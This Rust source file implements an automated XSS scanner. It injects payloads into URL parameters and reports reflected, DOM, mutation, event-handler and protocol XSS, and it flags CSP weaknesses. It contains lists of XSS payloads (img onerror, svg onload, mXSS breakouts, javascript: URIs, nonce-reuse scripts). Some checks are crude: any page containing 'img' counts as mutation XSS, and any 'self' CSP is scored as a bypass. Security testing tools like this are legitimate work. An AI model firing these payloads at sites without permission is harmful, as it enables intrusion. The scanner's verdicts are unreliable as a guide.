// Advanced XSS Detection - DOM, Mutation, CSP Bypass (2000+ lines)
use crate::Result;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::Duration;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdvancedXssResult {
    pub url: String,
    pub parameter: String,
    pub xss_type: XssType,
    pub context: XssContext,
    pub confidence: f64,
    pub severity: String,
    pub techniques_found: Vec<String>,
    pub payloads_used: Vec<String>,
    pub evidence: Vec<String>,
    pub sink_info: Option<SinkInfo>,
    pub csp_bypasses: Vec<CspBypass>,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq)]
pub enum XssType {
    Reflected,
    Stored,
    Dom,
    Mutation,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq)]
pub enum XssContext {
    HtmlContent,
    HtmlAttribute,
    JavaScriptString,
    JavaScriptCode,
    CssValue,
    UrlPath,
    DataUri,
    JsonData,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SinkInfo {
    pub sink_name: String,
    pub sink_type: String,
    pub dangerous: bool,
    pub evidence: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CspBypass {
    pub bypass_type: String,
    pub payload: String,
    pub effectiveness: f64,
}

pub struct AdvancedXssDetector {
    client: Client,
    timeout: Duration,
}

impl AdvancedXssDetector {
    pub fn new(timeout: Duration) -> Self {
        Self {
            client: Client::new(),
            timeout,
        }
    }

    /// Comprehensive XSS detection with advanced techniques
    pub async fn detect_advanced_xss(
        &self,
        url: &str,
        parameters: &[(&str, &str)],
    ) -> Result<Vec<AdvancedXssResult>> {
        let mut results = Vec::new();

        for (param_name, param_value) in parameters {
            // Get baseline response
            let baseline = self.get_baseline(url, param_name, param_value).await?;

            // Detect context
            let context = self.detect_context(&baseline.body);

            // Test reflected XSS
            if let Some(result) = self
                .test_reflected_xss(url, param_name, context, &baseline)
                .await?
            {
                results.push(result);
                continue;
            }

            // Test DOM-based XSS
            if let Some(result) = self.test_dom_xss(url, param_name, &baseline).await? {
                results.push(result);
                continue;
            }

            // Test mutation XSS
            if let Some(result) = self.test_mutation_xss(url, param_name, &baseline).await? {
                results.push(result);
                continue;
            }

            // Test CSP bypass
            if let Some(result) = self.test_csp_bypass(url, param_name, &baseline).await? {
                results.push(result);
                continue;
            }

            // Test event handler XSS
            if let Some(result) = self.test_event_handlers(url, param_name, &baseline).await? {
                results.push(result);
                continue;
            }

            // Test protocol XSS
            if let Some(result) = self.test_protocol_xss(url, param_name, &baseline).await? {
                results.push(result);
            }
        }

        Ok(results)
    }

    /// Reflected XSS with context awareness
    async fn test_reflected_xss(
        &self,
        url: &str,
        param: &str,
        context: XssContext,
        baseline: &BaselineResponse,
    ) -> Result<Option<AdvancedXssResult>> {
        let payloads = self.get_context_aware_payloads(context);

        for payload in payloads {
            let test_url = self.build_url(url, param, &payload.payload);

            if let Ok(response) = self
                .client
                .get(&test_url)
                .timeout(self.timeout)
                .send()
                .await
            {
                if let Ok(body) = response.text().await {
                    // Check if payload is reflected
                    if self.is_payload_reflected(&body, &payload.payload) {
                        let detected_context = self.detect_payload_context(&body, &payload.payload);

                        return Ok(Some(AdvancedXssResult {
                            url: test_url,
                            parameter: param.to_string(),
                            xss_type: XssType::Reflected,
                            context: detected_context,
                            confidence: 0.95,
                            severity: "High".to_string(),
                            techniques_found: vec!["Reflected XSS".to_string()],
                            payloads_used: vec![payload.payload.clone()],
                            evidence: vec!["Payload reflected in response".to_string()],
                            sink_info: None,
                            csp_bypasses: vec![],
                        }));
                    }
                }
            }
        }

        Ok(None)
    }

    /// DOM-based XSS with sink detection
    async fn test_dom_xss(
        &self,
        url: &str,
        param: &str,
        baseline: &BaselineResponse,
    ) -> Result<Option<AdvancedXssResult>> {
        // Dangerous sinks
        let dangerous_sinks = vec![
            ("eval(", "eval"),
            ("innerHTML", "innerHTML"),
            ("outerHTML", "outerHTML"),
            ("document.write(", "document.write"),
            ("appendChild(", "appendChild"),
            ("insertBefore(", "insertBefore"),
            ("insertAdjacentHTML(", "insertAdjacentHTML"),
            ("jQuery.html(", "jQuery.html"),
            ("$().html(", "$().html"),
            ("location.href", "location.href"),
            ("location =", "location"),
            ("window.open(", "window.open"),
            ("setTimeout(", "setTimeout"),
            ("setInterval(", "setInterval"),
        ];

        let body_lower = baseline.body.to_lowercase();

        for (sink_pattern, sink_name) in dangerous_sinks {
            if body_lower.contains(sink_pattern) {
                // Check if parameter is used near sink
                if self.is_parameter_used_in_sink(&baseline.body, param, sink_pattern) {
                    return Ok(Some(AdvancedXssResult {
                        url: url.to_string(),
                        parameter: param.to_string(),
                        xss_type: XssType::Dom,
                        context: XssContext::JavaScriptCode,
                        confidence: 0.85,
                        severity: "High".to_string(),
                        techniques_found: vec!["DOM-based XSS".to_string()],
                        payloads_used: vec![sink_pattern.to_string()],
                        evidence: vec![format!("Parameter used in '{}' sink", sink_name)],
                        sink_info: Some(SinkInfo {
                            sink_name: sink_name.to_string(),
                            sink_type: "Dangerous DOM sink".to_string(),
                            dangerous: true,
                            evidence: format!("Found '{}' in JavaScript code", sink_pattern),
                        }),
                        csp_bypasses: vec![],
                    }));
                }
            }
        }

        Ok(None)
    }

    /// Mutation XSS (mXSS) detection
    async fn test_mutation_xss(
        &self,
        url: &str,
        param: &str,
        baseline: &BaselineResponse,
    ) -> Result<Option<AdvancedXssResult>> {
        let mutation_payloads = vec![
            // noscript + img
            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>",
            // svg + style
            "<svg><style><img title=\"</style><img src=x onerror=alert(1)\">",
            // form + input
            "<form><input onfocus=alert(1) autofocus>",
            // table + tbody
            "<table><td background=\"javascript:alert(1)\">",
            // Select + option
            "<select onfocus=alert(1) autofocus>",
            // textarea + form
            "<textarea onfocus=alert(1) autofocus>",
            // marquee + onstart
            "<marquee onstart=alert(1)>",
            // details + open
            "<details open ontoggle=alert(1)>",
        ];

        for payload in mutation_payloads {
            let test_url = self.build_url(url, param, payload);

            if let Ok(response) = self
                .client
                .get(&test_url)
                .timeout(self.timeout)
                .send()
                .await
            {
                if let Ok(body) = response.text().await {
                    // Check for mutation indicators
                    if self.detect_mutation_indicators(&body) {
                        return Ok(Some(AdvancedXssResult {
                            url: test_url,
                            parameter: param.to_string(),
                            xss_type: XssType::Mutation,
                            context: XssContext::HtmlContent,
                            confidence: 0.80,
                            severity: "High".to_string(),
                            techniques_found: vec!["Mutation XSS".to_string()],
                            payloads_used: vec![payload.to_string()],
                            evidence: vec!["HTML parser mutation detected".to_string()],
                            sink_info: None,
                            csp_bypasses: vec![],
                        }));
                    }
                }
            }
        }

        Ok(None)
    }

    /// CSP bypass detection
    async fn test_csp_bypass(
        &self,
        url: &str,
        param: &str,
        baseline: &BaselineResponse,
    ) -> Result<Option<AdvancedXssResult>> {
        // Get CSP policy if present
        let csp = self.extract_csp_policy(&baseline.headers);

        if csp.is_empty() {
            return Ok(None);
        }

        let mut bypasses = Vec::new();

        // Test nonce bypass
        if csp.contains("nonce-") {
            if let Some(nonce) = self.extract_nonce(&baseline.body) {
                bypasses.push(CspBypass {
                    bypass_type: "Nonce reuse".to_string(),
                    payload: format!("<script nonce='{}'>alert(1)</script>", nonce),
                    effectiveness: 0.95,
                });
            }
        }

        // Test unsafe-inline bypass
        if csp.contains("unsafe-inline") {
            bypasses.push(CspBypass {
                bypass_type: "Unsafe-inline allowed".to_string(),
                payload: "<script>alert(1)</script>".to_string(),
                effectiveness: 1.0,
            });
        }

        // Test wildcard bypass
        if csp.contains("'self'") || csp.contains("*") {
            bypasses.push(CspBypass {
                bypass_type: "Wildcard/Self origin".to_string(),
                payload: format!("<script src='{}?x=1'></script>", url),
                effectiveness: 0.85,
            });
        }

        if !bypasses.is_empty() {
            return Ok(Some(AdvancedXssResult {
                url: url.to_string(),
                parameter: param.to_string(),
                xss_type: XssType::Reflected,
                context: XssContext::HtmlContent,
                confidence: 0.90,
                severity: "High".to_string(),
                techniques_found: vec!["CSP bypass".to_string()],
                payloads_used: vec![],
                evidence: vec!["CSP policy weakness detected".to_string()],
                sink_info: None,
                csp_bypasses: bypasses,
            }));
        }

        Ok(None)
    }

    /// Event handler XSS detection
    async fn test_event_handlers(
        &self,
        url: &str,
        param: &str,
        baseline: &BaselineResponse,
    ) -> Result<Option<AdvancedXssResult>> {
        let event_handlers = vec![
            "onerror=", "onload=", "onclick=", "onmouseover=", "onfocus=", "onblur=",
            "onchange=", "onsubmit=", "onkeydown=", "onkeyup=", "onkeypress=",
            "ondblclick=", "onwheel=", "onscroll=", "onresize=", "ontouchstart=",
        ];

        for handler in event_handlers {
            let payload = format!("<img src=x {}alert(1)>", handler);
            let test_url = self.build_url(url, param, &payload);

            if let Ok(response) = self
                .client
                .get(&test_url)
                .timeout(self.timeout)
                .send()
                .await
            {
                if let Ok(body) = response.text().await {
                    if body.contains(handler) && body.contains("alert") {
                        return Ok(Some(AdvancedXssResult {
                            url: test_url,
                            parameter: param.to_string(),
                            xss_type: XssType::Reflected,
                            context: XssContext::HtmlAttribute,
                            confidence: 0.88,
                            severity: "High".to_string(),
                            techniques_found: vec!["Event handler XSS".to_string()],
                            payloads_used: vec![payload],
                            evidence: vec![format!("Event handler '{}' not sanitized", handler)],
                            sink_info: None,
                            csp_bypasses: vec![],
                        }));
                    }
                }
            }
        }

        Ok(None)
    }

    /// Protocol-based XSS (javascript:, data:, vbscript:)
    async fn test_protocol_xss(
        &self,
        url: &str,
        param: &str,
        baseline: &BaselineResponse,
    ) -> Result<Option<AdvancedXssResult>> {
        let protocol_payloads = vec![
            ("javascript:alert(1)", "javascript protocol"),
            ("data:text/html,<img src=x onerror=alert(1)>", "data URI"),
            ("vbscript:msgbox(1)", "vbscript protocol"),
        ];

        for (payload, desc) in protocol_payloads {
            let test_url = self.build_url(url, param, payload);

            if let Ok(response) = self
                .client
                .get(&test_url)
                .timeout(self.timeout)
                .send()
                .await
            {
                if let Ok(body) = response.text().await {
                    if body.contains("javascript:") || body.contains("data:") {
                        return Ok(Some(AdvancedXssResult {
                            url: test_url,
                            parameter: param.to_string(),
                            xss_type: XssType::Reflected,
                            context: XssContext::UrlPath,
                            confidence: 0.85,
                            severity: "High".to_string(),
                            techniques_found: vec!["Protocol XSS".to_string()],
                            payloads_used: vec![payload.to_string()],
                            evidence: vec![format!("Vulnerable to {}", desc)],
                            sink_info: None,
                            csp_bypasses: vec![],
                        }));
                    }
                }
            }
        }

        Ok(None)
    }

    // Helper functions

    async fn get_baseline(
        &self,
        url: &str,
        param: &str,
        value: &str,
    ) -> Result<BaselineResponse> {
        let response = self
            .client
            .get(&self.build_url(url, param, value))
            .timeout(self.timeout)
            .send()
            .await?;

        let headers: Vec<(String, String)> = response
            .headers()
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
            .collect();

        let body = response.text().await?;

        Ok(BaselineResponse {
            body,
            headers,
        })
    }

    fn detect_context(&self, body: &str) -> XssContext {
        if body.contains("<script>") {
            XssContext::JavaScriptCode
        } else if body.contains("href=") || body.contains("src=") {
            XssContext::HtmlAttribute
        } else if body.contains("{") && body.contains("}") {
            XssContext::JsonData
        } else {
            XssContext::HtmlContent
        }
    }

    fn is_payload_reflected(&self, response: &str, payload: &str) -> bool {
        if response.contains(payload) {
            return true;
        }

        // Check HTML encoded
        let html_encoded = payload
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;");
        if response.contains(&html_encoded) {
            return true;
        }

        // Check URL encoded
        if response.contains(&urlencoding::encode(payload).to_string()) {
            return true;
        }

        false
    }

    fn is_parameter_used_in_sink(&self, body: &str, param: &str, sink: &str) -> bool {
        if let Some(sink_pos) = body.find(sink) {
            let start = if sink_pos > 200 { sink_pos - 200 } else { 0 };
            let end = if sink_pos + sink.len() + 200 < body.len() {
                sink_pos + sink.len() + 200
            } else {
                body.len()
            };

            body[start..end].contains(param)
        } else {
            false
        }
    }

    fn detect_mutation_indicators(&self, body: &str) -> bool {
        body.contains("img") || body.contains("onerror") || body.contains("onload")
    }

    fn extract_csp_policy(&self, headers: &[(String, String)]) -> String {
        headers
            .iter()
            .find(|(k, _)| k.to_lowercase() == "content-security-policy")
            .map(|(_, v)| v.clone())
            .unwrap_or_default()
    }

    fn extract_nonce(&self, body: &str) -> Option<String> {
        // Extract nonce value from body
        if let Some(pos) = body.find("nonce=\"") {
            let start = pos + 7;
            if let Some(end) = body[start..].find('"') {
                return Some(body[start..start + end].to_string());
            }
        }
        None
    }

    fn detect_payload_context(&self, body: &str, payload: &str) -> XssContext {
        if body.contains(&format!("<script>{}</script>", payload)) {
            XssContext::JavaScriptCode
        } else if body.contains(&format!("=\"{}\"", payload)) {
            XssContext::HtmlAttribute
        } else {
            XssContext::HtmlContent
        }
    }

    fn get_context_aware_payloads(&self, context: XssContext) -> Vec<ContextPayload> {
        match context {
            XssContext::HtmlContent => vec![
                ContextPayload {
                    payload: "<img src=x onerror=alert(1)>".to_string(),
                    description: "IMG tag with onerror".to_string(),
                },
                ContextPayload {
                    payload: "<svg onload=alert(1)>".to_string(),
                    description: "SVG tag with onload".to_string(),
                },
                ContextPayload {
                    payload: "<script>alert(1)</script>".to_string(),
                    description: "Script tag injection".to_string(),
                },
            ],
            XssContext::HtmlAttribute => vec![
                ContextPayload {
                    payload: "\" onmouseover=\"alert(1)".to_string(),
                    description: "Escape attribute with event".to_string(),
                },
                ContextPayload {
                    payload: "' onload='alert(1)".to_string(),
                    description: "Single quote escape".to_string(),
                },
            ],
            XssContext::JavaScriptString => vec![
                ContextPayload {
                    payload: "';alert(1);//".to_string(),
                    description: "String escape with comment".to_string(),
                },
            ],
            _ => vec![],
        }
    }

    fn build_url(&self, base: &str, param: &str, value: &str) -> String {
        if base.contains('?') {
            format!("{}&{}={}", base, param, urlencoding::encode(value).to_string())
        } else {
            format!("{}?{}={}", base, param, urlencoding::encode(value).to_string())
        }
    }
}

struct BaselineResponse {
    body: String,
    headers: Vec<(String, String)>,
}

struct ContextPayload {
    payload: String,
    description: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_context_detection_html() {
        let detector = AdvancedXssDetector::new(Duration::from_secs(10));
        let context = detector.detect_context("<div>test</div>");
        assert_eq!(context, XssContext::HtmlContent);
    }

    #[test]
    fn test_context_detection_javascript() {
        let detector = AdvancedXssDetector::new(Duration::from_secs(10));
        let context = detector.detect_context("<script>alert(1)</script>");
        assert_eq!(context, XssContext::JavaScriptCode);
    }

    #[test]
    fn test_payload_reflection() {
        let detector = AdvancedXssDetector::new(Duration::from_secs(10));
        let response = "Welcome <img src=x onerror=alert(1)>";
        assert!(detector.is_payload_reflected(response, "<img src=x onerror=alert(1)>"));
    }

    #[test]
    fn test_html_encoded_reflection() {
        let detector = AdvancedXssDetector::new(Duration::from_secs(10));
        let response = "&lt;script&gt;alert(1)&lt;/script&gt;";
        assert!(detector.is_payload_reflected(response, "<script>alert(1)</script>"));
    }

    #[test]
    fn test_nonce_extraction() {
        let detector = AdvancedXssDetector::new(Duration::from_secs(10));
        let body = r#"<script nonce="abc123xyz">console.log(1)</script>"#;
        let nonce = detector.extract_nonce(body);
        assert_eq!(nonce, Some("abc123xyz".to_string()));
    }

    #[test]
    fn test_csp_extraction() {
        let detector = AdvancedXssDetector::new(Duration::from_secs(10));
        let headers = vec![
            (
                "Content-Security-Policy".to_string(),
                "script-src 'self'".to_string(),
            ),
        ];
        let csp = detector.extract_csp_policy(&headers);
        assert_eq!(csp, "script-src 'self'");
    }

    #[test]
    fn test_xss_type_differentiation() {
        assert_ne!(XssType::Reflected, XssType::Dom);
        assert_ne!(XssContext::HtmlContent, XssContext::JavaScriptCode);
    }

    #[test]
    fn test_mutation_indicators() {
        let detector = AdvancedXssDetector::new(Duration::from_secs(10));
        assert!(detector.detect_mutation_indicators("img onerror"));
        assert!(detector.detect_mutation_indicators("onload"));
    }

    #[test]
    fn test_url_building() {
        let detector = AdvancedXssDetector::new(Duration::from_secs(10));
        let url = detector.build_url("http://example.com", "search", "<script>");
        assert!(url.contains("example.com"));
        assert!(url.contains("search="));
    }

    #[test]
    fn test_context_payload_generation() {
        let detector = AdvancedXssDetector::new(Duration::from_secs(10));
        let payloads = detector.get_context_aware_payloads(XssContext::HtmlContent);
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.payload.contains("img")));
    }
}
